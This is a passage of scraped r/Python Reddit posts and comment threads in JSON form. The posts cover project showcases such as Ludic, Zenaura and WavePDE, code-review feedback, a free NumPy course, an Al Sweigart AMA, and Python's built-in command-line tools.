            "content": "i think the SpOnGeBoB hotkey is the most usefull.👌"
        },
        {
            "author": "blood_centrifuge",
            "score": "10",
            "content": "Have you put this on github? It would great if you could share the repo."
        },
        {
            "author": "dibs45",
            "score": "15",
            "content": "I created a tool using Python and the module pynput that allows me to create custom hotkeys and bind them to any custom function I write. I used that tool to create some hotkeys that use the clipboard to edit text in place. I'll be hosting the source code on github soon. My github can be found here."
        },
        {
            "author": "LawLombie",
            "score": "24",
            "content": "I think the \"sPOnGEboB MEmE\" one's case should be rAnDOm instead of alternating between UPPERCASE and lowercase"
        },
        {
            "author": "ALABAMA-SHIT",
            "score": "5",
            "content": "That's absolutely brilliant! And very useful (especially the math part)"
        },
        {
            "author": "Project_O",
            "score": "5",
            "content": "* tries to select your entire dissertation * Alt+A * python script runs and turns your entire essay iNtO tHiS fOrMat *"
        }
    ]
},
{
    "post_author": "Mews75",
    "post_id": "1d91hsb",
    "post_score": "20",
    "post_time": "Thursday, June 6, 2024 at 12:31:39 AM GMT+3",
    "flair_text": "Feedback Request",
    "post_title": "Code review for my simple project",
    "media": [
        "https://github.com/Mews/simpleaudiostretch"
    ],
    "post_content": "I've made this simple little package to stretch out audios https://github.com/Mews/simpleaudiostretch\nHowever I'm still new to uploading packages to pypi and doing documentation and the sorts, so I'd appreciate it if someone could review my project and see if what I'm doing are the best practices.\nThank you in advance if anyone is willing to help",
    "comments": [
        {
            "author": "Puzzleheaded_Bill271",
            "score": "20",
            "content": "Nice little project! Feedback: you don't need \\n in docstrings should have a space after the hash symbol on your comments I personally think that starting your docstrings with \"A function to do x\" is pointless, it's obvious it's a function line lengths should be under 100 chars, I viewed it on a mobile so it's hard to tell, but I think your docstrings were longer than that. (python convention is under 80chars, but I think that's ott) I always strongly advise you use a linter and typechecker since it'll fix formatting issues and make sure your types are as expected. My favourites are ruff and mypy I've never published anything to pypi so maybe it's something to do with that, but how come you have a pyproject.toml and no lockfile? testing would be good, even if it just checks that speeding up a track divides it's length by 2, and vice versa. I like pytest, but unittest is also good I don't really like that most of the code is hidden away in the init.py. A named module would be clearer instead of cli.py you could put that in a main.py pathlib.Path is better than using string literals for filenames since it's more explicit Hope that helps, best of luck with it 👍",
            "replies": [
                {
                    "author": "roztopasnik",
                    "score": "9",
                    "content": "Also I have never seen the logic to be in init.py file",
                    "replies": [
                        {
                            "author": "Puzzleheaded_Bill271",
                            "score": "4",
                            "content": "Yeah, I've only ever used it to: set up things that are required for the package to work, (so kinda treating it like an init dunder method, but for the package) import things to make them available for import at the package level. But aside from those cases I don't use it either. Interested to hear if anyone else has had any other reason to put code in there",
                            "replies": [
                                {
                                    "author": "roztopasnik",
                                    "score": "4",
                                    "content": "It can also be used to limit what IDE is hinting when writing code.. but some IDEs don’t respect that"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "IAMARedPanda",
                    "score": "4",
                    "content": "The pep for lock files was rejected so the existence of a pyproject.toml doesn't necessarily necessitate a lock file since you need 3rd party programs to generate them."
                },
                {
                    "author": "Mews75",
                    "score": "2",
                    "content": "Thank you so much! I just have a few questions: What exactly is a linter or a typechecker? Does it do the same as the isinstance checks I have? How would I write tests for my project? Do I upload a sample file or something? Why can't the code be in __init__.py? I just put it there so that you can just import simplestretch without needing to import any subpackages, I thought it was the norm from the guide I was following. Whats the problem with the file being called cli.py? Where exactly should I use pathlib.Path?"
                }
            ]
        },
        {
            "author": "binlargin",
            "score": "3",
            "content": "What the others said. Good little project, looks clean. Could use unit tests and maybe some pre-commit love. And having functions that take variant types then do logic on them is bad, split them out and have a wrapper you call. Also you can have a private module _stretch.py then include from that in your init, keeps the code separate from the module config, it's convenient and there's \"one obvious way\" to import the functions",
            "replies": [
                {
                    "author": "Mews75",
                    "score": "2",
                    "content": "What do you mean by pre-commit love? I'm not very experienced with git if that's what its related to"
                }
            ]
        }
    ]
},
{
    "post_author": "Neb519",
    "post_id": "l1jdcj",
    "post_score": "2517",
    "post_time": "Thursday, January 21, 2021 at 12:45:27 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "I made a course on NumPy. It got good reviews, but sales were weak so I'm releasing the entire thing for free.",
    "media": [
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-5-challenge-the-game-of-doors",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-1-numpy-array-motivation",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-8-challenge-movie-ratings",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-3-challenge-one-hot-encoding",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-6-sorting",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-3-challenge-population-verification",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-6-infinity",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-1-advanced-array-indexing",
        "https://www.youtube.com/playlist?list=PL9oKUrtC4VP7ry0um1QOUUfJBXKnkf-dA",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-9-challenge-chic-fil-a",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-7-challenge-outer-product",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-5-nan",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-7-unique",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-7-random",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-10-challenge-psycho-parent",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-5-stacking",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-8-challenge-love-distance",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-1-1-introduction",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-2-numpy-array-basics",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-7-challenge-high-school-reunion",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-5-challenge-table-tennis",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-1-as_strided",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-1-broadcasting",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa/",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-6-basic-math-on-arrays",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-3-creating-numpy-arrays",
        "https://www.youtube.com/channel/UCOcsois3fuvgFRZGdozQHeg",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-4-boolean-indexing",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-1-where",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-8-challenge-gold-miner",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-6-challenge-peanut-butter",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-5-indexing-multidimensional-arrays",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-2-view-vs-copy",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-2-newaxis",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-3-reshape",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-6-challenge-wheres-waldo",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-4-challenge-cumulative-rainfall",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-4-concatenate",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-3-all-and-any",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-6-2-einsum",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-2-math-functions",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-5-4-challenge-prime-locations",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-9-challenge-professor-prick",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-10-challenge-taco-truck",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-4-indexing-1d-arrays",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-9-challenge-big-fish"
    ],
    "post_content": "My course is called Python NumPy For Your Grandma - So easy your grandma could learn it. Here's the course outline.\nIntroduction\n1.1 Introduction\nBasic Array Stuff\n2.1 NumPy Array Motivation\n2.2 NumPy Array Basics\n2.3 Creating NumPy Arrays\n2.4 Indexing 1-D Arrays\n2.5 Indexing Multidimensional Arrays\n2.6 Basic Math On Arrays\n2.7 Challenge: High School Reunion\n2.8 Challenge: Gold Miner\n2.9 Challenge: Chic-fil-A\nIntermediate Array Stuff\n3.1 Broadcasting\n3.2 newaxis\n3.3 reshape()\n3.4 Boolean Indexing\n3.5 nan\n3.6 infinity\n3.7 random\n3.8 Challenge: Love Distance\n3.9 Challenge: Professor Prick\n3.10 Challenge: Psycho Parent\nCommon Operations\n4.1 where()\n4.2 Math Functions\n4.3 all() and any()\n4.4 concatenate()\n4.5 Stacking\n4.6 Sorting\n4.7 unique()\n4.8 Challenge: Movie Ratings\n4.9 Challenge: Big Fish\n4.10 Challenge: Taco Truck\nAdvanced Array Stuff\n5.1 Advanced Array Indexing\n5.2 View vs Copy\n5.3 Challenge: Population Verification\n5.4 Challenge: Prime Locations\n5.5 Challenge: The Game of Doors\n5.6 Challenge: Peanut Butter\nFinal Boss\n6.1 as_strided()\n6.2 einsum()\n6.3 Challenge: One-Hot-Encoding\n6.4 Challenge: Cumulative Rainfall\n6.5 Challenge: Table Tennis\n6.6 Challenge: Where's Waldo\n6.7 Challenge: Outer Product\nIf you find this useful, please consider liking my videos and subscribing to my YouTube channel.",
    "comments": [
        {
            "author": "dbulger",
            "score": "101",
            "content": "",
            "replies": [
                {
                    "author": "Neb519",
                    "score": "47",
                    "content": ""
                }
            ]
        },
        {
            "author": "Umroayyar",
            "score": "61",
            "content": "",
            "replies": [
                {
                    "author": "Neb519",
                    "score": "22",
                    "content": ""
                }
            ]
        },
        {
            "author": "ekydfejj",
            "score": "23",
            "content": "Great offering to the community, thanks, wish you luck and subscribed."
        }
    ]
},
{
    "post_author": "pdcz",
    "post_id": "1d7sl6k",
    "post_score": "25",
    "post_time": "Tuesday, June 4, 2024 at 11:57:43 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Ludic Update: Web Apps in pure Python with HTMX, Themes, Component Catalog, new Documentation",
    "media": [
        "https://github.com/pydantic/FastUI?tab=readme-ov-file#the-principle-long-version",
        "https://getludic.dev/docs/",
        "https://reflex.dev/blog/2024-03-21-reflex-architecture/",
        "https://react.dev/",
        "https://www.starlette.io/",
        "https://github.com/paveldedik/ludic-template",
        "https://fastapi.tiangolo.com/",
        "https://htmx.org/essays/how-did-rest-come-to-mean-the-opposite-of-rest/",
        "https://htmx.org/",
        "https://getludic.dev/catalog/layouts"
    ],
    "post_content": "Hi everyone,\nI'd like to share couple of news regarding my personal project:\nNew documentation written in Ludic showcasing it's capabilities: https://getludic.dev/docs/\nNew section regrading Layouts inspired from the Every Layout Book: https://getludic.dev/catalog/layouts\nCookiecutter template to get quickly started: https://github.com/paveldedik/ludic-template\nI have a lot of plans with this project and I'd appreciate any feedback.\nAbout The Project\nLudic allows web development in pure Python with components. It uses HTMX to add UI interactivity and has a catalog of components.\nTarget Audience\nWeb developers\nPeople who want to build HTML pages in Python with typing\nPeople without knowledge of JavaScript who want to build interactive UIs\nPeople who want to use HTMX in their projects\nComparison With Similar Tools\nFeature Ludic FastUI Reflex\nHTML rendering Server Side Client Side Client Side\nUses Template Engine No No No\nUI interactivity </> htmx React React\nBackend framework Starlette FastAPI FastAPI\nClient-Server Communication HTML + REST JSON + REST WebSockets\nAny feedback is highly appreciated.",
    "comments": [
        {
            "author": "thedeepself",
            "score": "3",
            "content": "I'm curious how you selected htmx over unpoly. I'm not sure that your feature comparison is really relevant? The reason I say that is that the similar tools to ludic would be other pure python web development frameworks. Furthermore in that first row of the comparison you say that you do server side rendering. But the thing is is that the whole point of something like htmx is that has single page responsive apps where the rendering is actually client side. But I have to salute you for attempting to make a comparison and have some features for comparison. I developed the pure python web framework survey and I never really did a comparison of different tools. I did however create a section where each framework implemented to do MVC to give people an idea of how to implement a modestly complex app. Do you have an example of to do MVC that you can link me to?",
            "replies": [
                {
                    "author": "pdcz",
                    "score": "3",
                    "content": "Thank you for the response. I haven't checked unpoly that much but it seems to me that htmx suits better - you create components made of basic HTML elements which you use to replace parts of your DOM using the HTMX attributes. That said, I have an issue on github to support unpoly as well, it just requires investigation. May I ask which libraries would you use to compare Ludic to? Ludic is rendering all HTML on the server side, it is just using HTMX attributes to replace parts of the DOM, to me, it is much different approach than the one FastUI which is returning data from the server in JSON. I have a couple of examples on GitHub, but you have a good point, more complex example showcasing the MVC princible would be great. https://github.com/paveldedik/ludic/tree/main/examples",
                    "replies": [
                        {
                            "author": "thedeepself",
                            "score": "-9",
                            "content": "",
                            "replies": [
                                {
                                    "author": "dAnjou",
                                    "score": "8",
                                    "content": "You're both (almost) right. It's probably a confusion about the semantics of word \"render\". HTML has never been rendered on the server, it has always been rendered by the browser engine to display something to the user. There is, however, usually some template rendering using more or less dynamic data. And that is happening on the server with HTMX, and from what I've seen also with Unpoly. What happens on the client is probably better described as composing, not rendering."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "divad1196",
            "score": "2",
            "content": "I like the idea, I also started a similar project but in Rust to then expose it to python. In the example of the doc: How do you manage the database? Or anything session-related? It seems it will need to be a global variable? I am wondering why the counter takes a str. Isn't it able to convert it to an int as it uses starlette? I think it's strange to already have SuccessButton. You could have it in an external module or as an option of your package. To clarify: I see that you install \"ludic[full]\", but you import the buttons from a generic \"catalog\" => I think at some point in the import we should see \"bootstrap\" (or whatever framework it is). At least, there should be a Button function that is agnostic from a UI framework. it would be nice to simplify \"app.url_path_for(\"Counter\", value=int(value) + 1)\". fo example, you could imaging having a parameter with specific type and the the decorator would inject on object @app.get(\"/counter/{value}\") def Counter(value: str, cmp: SelfComponent) -> Cluster: # cmp = AppWrapper(\"Counter\") return Cluster( ButtonDanger( \"Decrement\", hx_get=cmp,app.url_path(value=int(value) - 1), hx_target=\"#counter\", ), ... ) The app.get could simply return a partial function of Couter. Or we could use another optional decorator, or have a manual way of declaring it (see the commented line)",
            "replies": [
                {
                    "author": "pdcz",
                    "score": "2",
                    "content": "Thank you, what is the name of your Rust project? I have a part time job in Rust and I love it. I was also thinking about writing similar tool in Rust a while ago but I'm not that experienced with Rust. And I found https://yew.rs/ To answer your questions: Ludic uses starlette (it is optional, I want to add support for fastapi and django in future), where you have State which you can use to bound db connections and stuff like that, see https://www.starlette.io/database/ Starlette doesn't allow negative numbers. So the counter would work only for natural numbers, I was thinking about changing the example so that only natural numbers are supported so that it is simplier. SuccessButton is imported from the catalog, which is optional to use, so yeah, it is optional :) Interesting idea with the counter. The problem is to make it flexible, I was thinking about just calling Counter(number + 1) in the view to render the necessary htmx attributes for swapping the content, but that is really hard to do."
                }
            ]
        }
    ]
},
{
    "post_author": "shardul08",
    "post_id": "d23ibi",
    "post_score": "2867",
    "post_time": "Tuesday, September 10, 2019 at 9:01:54 AM GMT+3",
    "flair_text": "",
    "post_title": "Found this on twitter",
    "media": [
        "https://i.redd.it/dbmkeewxipl31.jpg",
        "https://preview.redd.it/dbmkeewxipl31.jpg?width=640&crop=smart&auto=webp&s=07917a96e09e1ff435ee5c2368cf9e25de872ed6"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Frischfleisch",
            "score": "326",
            "content": "I feel like crying everyday because my company's still using 2.7..",
            "replies": [
                {
                    "author": "FluffyBunnyOK",
                    "score": "101",
                    "content": "We also have thousands of VMs and even worse some legacy physical with various versions of python 2 on them. I cannot even guarantee that \"import json\" will work.",
                    "replies": [
                        {
                            "author": "imanexpertama",
                            "score": "32",
                            "content": "What do you do with a thousand VMs?",
                            "replies": [
                                {
                                    "author": "atheistpiece",
                                    "score": "66",
                                    "content": "Whatever you want, their your VMs!"
                                },
                                {
                                    "author": "FluffyBunnyOK",
                                    "score": "4",
                                    "content": "Run thousands of applications. Many legacy apps ported to VMs because no one in the business is brave enough to workout which data we really need and coalesce it down to around 100 applications. I doubt any production server has Python 3 installed. The good news is that in Redhat 8 we will get Python 3. https://www.phoronix.com/scan.php?page=news_item&px=RHEL-8-No-Python-2"
                                }
                            ]
                        },
                        {
                            "author": "jaysunn",
                            "score": "0",
                            "content": "What are you doing to help port the code? Usually and organization that’s stuck at a version of software is due to an in-house application that needs to be ported to the new version. Most of the time the original authors are long gone and there is 0 documentation in regards to how it works. It’s fairly simple to yum install python3. The issue is usually the legacy code base is so fragile that the sysadmins can’t upgrade or everything will break. Why don’t you use one of the 1000 vms to rewrite the py2 application?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Raccoon_JS",
            "score": "98",
            "content": "f\"Type F for {respect}\"",
            "replies": [
                {
                    "author": "reinaldo866",
                    "score": "125",
                    "content": "import pyautogui pyautogui.press('F')"
                }
            ]
        },
        {
            "author": "Jim_Panzee",
            "score": "126",
            "content": "f-strings are sooo much better."
        }
    ]
},
{
    "post_author": "Beneficial-Ad-9243",
    "post_id": "1dazvjk",
    "post_score": "1",
    "post_time": "Saturday, June 8, 2024 at 1:27:15 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Introducing Zenaura, python framework for building scalable, maintainable component based SPAs.",
    "media": [
        "https://github.com/ARAldhafeeri/Zenaura",
        "https://araldhafeeri.github.io/zenaura-landing-page/",
        "https://araldhafeeri.github.io/Zenaura/"
    ],
    "post_content": "What My Project Does\nZenaura is a cutting-edge Python library, leveraging Pyodide and PyScript, designed to empower developers to create lightweight, performant, stateful, component-based Single Page Applications (SPAs) with ease. By utilizing a virtual DOM implementation, Zenaura enhances performance, reactivity, responsiveness, and interactivity, allowing developers to build dynamic web applications using familiar Python concepts and syntax.\nkey features\nExceptional Developer Experience: Intuitive and efficient development workflow.\nSmooth Learning Curve: Easy to learn and get started.\nModular Code Structure: Write clean, readable, and maintainable code.\nComponent-Based Architecture: Build reusable and scalable components.\nPage Management: Simplify page creation and navigation.\nBuilt-in Router: Seamless client-side routing.\nState and Props Management: Efficiently handle component states and properties.\nDependency Injection: Manage dependencies effortlessly.\nGlobal States and Components: Share states and components across the application.\nOptimized Virtual DOM: Enhance application performance with a highly efficient virtual DOM.\nComponent Lifecycle Methods: Control component behavior at different stages.\nForm Support: Easily manage form inputs and validation.\nAPI Integration: Integrate external APIs using the requests module.\ntarget Audience\nPython developers who want to build stateful, component based SPA using pure python.\nComparison with existing SPA building libraries, frameworks:\nPython Integration:\nLeverages PyScript and Pyodide: Zenaura allows your Python code to be compiled and transpiled into WebAssembly (WASM), enabling the execution of Python in the browser. This is a significant departure from traditional JavaScript-based frameworks like React, Angular, and Vue, which rely solely on JavaScript for client-side development.\nDeveloper Ecosystem:\nPythonic Development: Zenaura enables Python developers to build modern web applications without needing to switch to JavaScript, providing a seamless experience for those who are more comfortable with Python.\nUnified Language: By using Python for both front-end and back-end development, Zenaura reduces the context-switching overhead and allows for a more cohesive development experience.\nPerformance and Efficiency:\nVirtual DOM Implementation: Similar to React and Vue, Zenaura utilizes a virtual DOM to optimize rendering performance. However, Zenaura's implementation play more well with the virtual DOM as it update the real DOM in non-blocking asyn way. Also thanks to pydide the python interpreter is ported to WASM, which means less JS footprint , very light library sizes on every library developed around zenaura.\nComponent-Based Architecture:\nStateful Components: Zenaura's component-based architecture allows for building reusable, stateful components, akin to React and Vue. This promotes code reusability and modularity.\nEase of Learning and Use:\nSmooth Learning Curve: Zenaura offers an intuitive and straightforward learning path, especially for developers already familiar with Python. This makes it accessible and easy to adopt compared to the steeper learning curves of frameworks like Angular.\nEcosystem and Community:\nGrowing Python Ecosystem: By integrating with the Python ecosystem, Zenaura can leverage existing Python libraries and tools, providing a rich set of functionalities and a vibrant community for support and collaboration.\nResources:\nGitHub Repository: https://github.com/ARAldhafeeri/Zenaura\nLanding Page: https://araldhafeeri.github.io/zenaura-landing-page/\nDocumentation: https://araldhafeeri.github.io/Zenaura/",
    "comments": []
},
{
    "post_author": "salastrodaemon",
    "post_id": "1d91ylf",
    "post_score": "15",
    "post_time": "Thursday, June 6, 2024 at 12:51:33 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Wave Equation Solver in Python",
    "media": [
        "https://www.reddit.com/r/Python/",
        "https://github.com/salastro/wavepde"
    ],
    "post_content": "Hello r/Python,\nWhat My Project Does\nI wanted to share a Python project I've been working on called WavePDE. WavePDE is a simulation and animation tool for studying wave equations in one or two dimensions. It's a handy tool for anyone interested in wave phenomena, also it's customizable and interactive. You can adjust domain size, grid resolution, wave speed, time step, boundary conditions (Dirichlet or Neumann), initial conditions, and more. Additionally, it is possible save your simulations as video files for further analysis or presentations.\nTarget Audience\nI mainly created this tool while working on my research project. It is not yet complete since it deadens heavily on some parts I still didn't finish. It is about numeric computations of the wave equation on arbitrary boundaries. So I still need to apply some mask on these results and extend the Neumann conditions beyond the current implementation.\nComparison\nThis tool is way more customizable (at least imho) than other Python tools I found online. The code is more structured allowing for future extensibility. I also tried to make it as user-friendly as possible. I hope you find it useful and I would appreciate any feedback you might have. I still didn't implement tests, so if you find any bugs please let me know. Also, the documentation is lacking, but I'm working on it.\nYou can find the code on GitHub: https://github.com/salastro/wavepde",
    "comments": [
        {
            "author": "FeLoNy111",
            "score": "2",
            "content": "Why finite difference instead of finite element?",
            "replies": [
                {
                    "author": "salastrodaemon",
                    "score": "1",
                    "content": "It was the method we studied in my differential equations course. I might extend and implement other methods in the future. Could you tell me more about finite element?"
                }
            ]
        }
    ]
},
{
    "post_author": "AlSweigart",
    "post_id": "otbvoj",
    "post_score": "2492",
    "post_time": "Wednesday, July 28, 2021 at 6:11:47 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Hello, world! I'm Al Sweigart, author of \"Automate the Boring Stuff with Python\" and several other programming books. AMA!",
    "media": [
        "https://inventwithpython.com/",
        "https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow",
        "https://inventwithpython.com/beyond/",
        "https://inventwithpython.com/bigbookpython/",
        "https://www.reddit.com/r/Python/comments/obq0cg/automate_the_boring_stuff_with_python_online/",
        "https://www.youtube.com/watch?v=AfBqVVKg4GE"
    ],
    "post_content": "Howdy, y'all. I'm Al Sweigart (rhymes with \"why dirt\"), author of \"Automate the Boring Stuff with Python\" and several other programming books. I release all of my books under a Creative Commons license, so you can read them for free on my website at https://inventwithpython.com\nMy latest books are The Big Book of Small Python Projects and Beyond the Basic Stuff with Python. I'm currently working on a book about recursion (the recursion jokes get funnier every time I hear them) which should be available in 2022. The ideas for this book grew into a 2018 North Bay Python talk I gave.\n\"Big Book\" contains the source code for 81 games, puzzles, simulations, and animations that were designed to be short and simple to understand. Folks tend to get caught up in repeating yet another \"hello world\" tutorial, but don't quite know how to apply the programming concepts they learned into actual programs. This book is full of source code that they can study to see how real-world programs work. They aren't just code snippets but actual, runnable programs. If you've been told you should \"work on your projects\" but don't know where to start, or if you've been told \"look at the source code of open source projects\" but found them undocumented and inscrutable, check out these programs.\n\"Beyond the Basic Stuff\" is a sort of follow up to \"Automate the Boring Stuff\" (or any other beginner Python resource). It goes into how professionals write code and best practices they follow. There's information on how to find help on your own, how to format your code and name your variables, an explanation of common programming jargon, the basics of Git, three chapters on object-oriented programming (and more importantly, when and why to use OOP), and more.\nYou've probably seen my posts at the start of the month when I make my online Python course free. About 15,000 to 30,000 people sign up each month, though according to my stats only about 5% of people actually complete the course (which is typical for online courses, free or paid).\nI got started writing programming books in 2009 when my then-girlfriend was a nanny for kid who wanted to learn to program. I started writing a book (which would become Invent Your Own Computer Games with Python) and self-published. People liked it, so I kept writing, and Automate was my first book through a traditional publisher, No Starch Press. I quit my software developer job in 2013 to finish writing Automate, thinking I'd get another software dev job in a year. But I kept having more ideas for other books, tutorials, videos, etc. so I'm still here writing.\nAsk me anything! Post your questions and upvote questions you find interesting, and at 2pm central I'll begin replying.\nEDIT (4:30pm Central) Wow, I've been typing nonstop for two and a half hours. I'm going to take a quick break and then keep going. Thanks for the questions, everyone!\nEDIT 2: Oh yeah, I forgot to mention I'm also creating a 56-video Udemy course for the Beyond the Basic Stuff with Python book as well. So far I only have the first 15 videos done, but you can watch them on YouTube.\nEDIT (7:00pm) Heh, wow another two hours flew by. I'm going to drive home and then maybe answer a few more. Thanks again, everyone!\nEDIT (10:30pm) Calling it a night. I'll probably answer a few more tomorrow, but I have to get back to work. Thanks again, everyone! Oh, and if you can help me out, writing an (honest) Amazon review for my books (especially the latest two) or even just sharing the links to the free online copies would be really help me get them in front of more people.",
    "comments": [
        {
            "author": "IAmKindOfCreative",
            "score": "1",
            "content": ""
        },
        {
            "author": "rohffff",
            "score": "71",
            "content": ""
        },
        {
            "author": "Knecth",
            "score": "303",
            "content": "So we've already automated the boring stuff. How long till we reach fully automated luxury communism? Jokes aside, I have a more serious question: Do you think programming should be taught to kids at schools? Do you see any potential issue associated? (Edit: Formatting)"
        },
        {
            "author": "richphi1618",
            "score": "25",
            "content": "There is a lot of material out there that takes someone from zero to beginner or even zero to intermediate. (thanks in no small part to you ;D ) Are there any resources or books you recommend that could help someone who is looking to go from intermediate -> expert? Does this just come from use cases and application? If so is there a collection of projects you look for to classify someone as an \"advanced\" python programmer?"
        },
        {
            "author": "tomeschmusic",
            "score": "21",
            "content": "How long until machine learning turns coding into something more like music-making today?"
        },
        {
            "author": "coggro",
            "score": "55",
            "content": "Hey, Al! Question first: How do you set up your dev environment? I work in Node a lot of the time and, for all it’s flaws, I like how it silos dependencies and nvm is a great version manager. What do you use for Python version and dependency management? Pyenv seems good to me for versioning, but convenient dependency solutions continue to elude me. Been a big fan for a long time! I started learning from you with Hacking Secret Ciphers and just got your Big Book. I know I can read them for free online, but I like the way you teach and what you’re doing for Python and beginner programmers. Keep it up!"
        },
        {
            "author": "deleuex",
            "score": "57",
            "content": "Wow it’s not often I catch an AMA in the beginning but I just wanted to say thank you . Your Udemy course on automate the boring stuff has been a real help. I’m currently enrolled in WGU and taking their Python classe and it’s been a real struggle. If it wasn’t for your course and how you explain things in simple term I probably would have given up long ago."
        },
        {
            "author": "Your_PopPop",
            "score": "86",
            "content": "What new stuff would you like to see in later versions of Python, beyond 3.10?"
        },
        {
            "author": "LambBrainz",
            "score": "36",
            "content": "What makes you the happiest? And what pisses you off the most?"
        }
    ]
},
{
    "post_author": "treyhunner",
    "post_id": "1d7a1ql",
    "post_score": "341",
    "post_time": "Monday, June 3, 2024 at 8:24:54 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Python's many command-line utilities",
    "media": [
        "https://pym.dev/cli-tools/"
    ],
    "post_content": "Python 3.12 comes bundled with 50 command-line tools.\nFor example, python -m webbrowser http://example.com opens a web browser, python -m sqlite3 launches a sqlite prompt, and python -m ast my_file.py shows the abstract syntax tree for a given Python file.\nI've dug into each of them and categorized them based on their purpose and how useful they are.\nPython's many command-line tools",
    "comments": [
        {
            "author": "vinnypotsandpans",
            "score": "91",
            "content": "http.server is really nice when I want to move some files to another machine",
            "replies": [
                {
                    "author": "BeansOnToastMan",
                    "score": "19",
                    "content": "That's one of my favs! Super unsecure, but very convenient."
                }
            ]
        },
        {
            "author": "tartare4562",
            "score": "32",
            "content": "And you can implement your own by adding a __main__.py script to your packages!",
            "replies": [
                {
                    "author": "treyhunner",
                    "score": "13",
                    "content": "Yup! Here's Django's as an example (python -m django is the same as the django-admin command)."
                }
            ]
        },
        {
            "author": "penguindustin",
            "score": "24",
            "content": "TIL you can have an aysnc supported REPL, super handy!"
        },
        {
            "author": "buckypimpin",
            "score": "11",
            "content": "i saw repls for sqlite3 and even uuid aswell",
            "replies": [
                {
                    "author": "treyhunner",
                    "score": "21",
                    "content": "Both of those were added in Python 3.12, so they're not quite as well known yet. Python 3.13 will also include a command-line interface for the random module: $ python3.13 -m random 6 1 $ python3.13 -m random 3.14159 3.0145311549545397 $ python3.13 -m random this is great is"
                }
            ]
        },
        {
            "author": "kortez84",
            "score": "6",
            "content": "python -m json.tool is baked into my muscle memory for formatting json on the command line. you can use it with a file or pipe in stdin. extremely useful tool",
            "replies": [
                {
                    "author": "cymrow",
                    "score": "13",
                    "content": "jq"
                }
            ]
        }
    ]
},
{
    "post_author": "DouweOsinga",
    "post_id": "1d7fatn",
    "post_score": "7",
    "post_time": "Monday, June 3, 2024 at 11:54:17 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Self updating spreadsheet with popular questions from Ask Reddit and summarized answers using OpenAI",
    "media": [
        "https://docs.google.com/spreadsheets/d/1YXXBW_B6DeKVJQHGjowf1AJr9s6_yYItPcvDlChf9YM/edit#gid=0",
        "https://www.reddit.com/r/AskReddit/",
        "https://github.com/neptyneco/codesamples/blob/master/ask_reddit.py",
        "https://platform.openai.com/docs/overview",
        "https://www.reddit.com/dev/api/",
        "https://developer.x.com/en/docs/twitter-api",
        "https://workspace.google.com/marketplace/app/neptyne_python_for_sheets/891309878867",
        "https://x.com/reddit_answers"
    ],
